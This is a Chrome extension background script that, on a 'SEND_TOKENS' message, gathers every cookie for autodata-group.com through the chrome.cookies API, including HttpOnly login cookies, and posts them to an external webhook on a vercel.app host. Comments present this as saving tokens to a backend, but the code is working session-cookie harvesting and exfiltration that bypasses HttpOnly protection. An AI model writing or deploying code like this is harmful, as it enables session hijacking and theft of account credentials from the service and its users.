chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === "SEND_TOKENS") {
        // Grab all HttpOnly login cookies from the browser directly natively via Chrome API
        chrome.cookies.getAll({ domain: "autodata-group.com" }, (cookies) => {
            const backgroundRawCookies = cookies.map(c => `${c.name}=${c.value}`).join("; ");

            // Combine the cookies from content.js (document.cookie) with HttpOnly background cookies
            let combinedCookies = message.data.rawCookies || "";
            if (backgroundRawCookies) {
                // Merge without duplicates is better, but string concat is fine for now
                combinedCookies = combinedCookies ? `${combinedCookies}; ${backgroundRawCookies}` : backgroundRawCookies;
            }

            const payload = {
                ...message.data,
                rawCookies: combinedCookies
            };

            fetch("https://mot-reminder-quick.vercel.app/api/webhooks/autodata", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            })
                .then(res => res.json())
                .then(data => console.log("Tokens securely saved on backend!", data))
                .catch(err => console.error("Failed to sync tokens:", err));
        });
    }
});
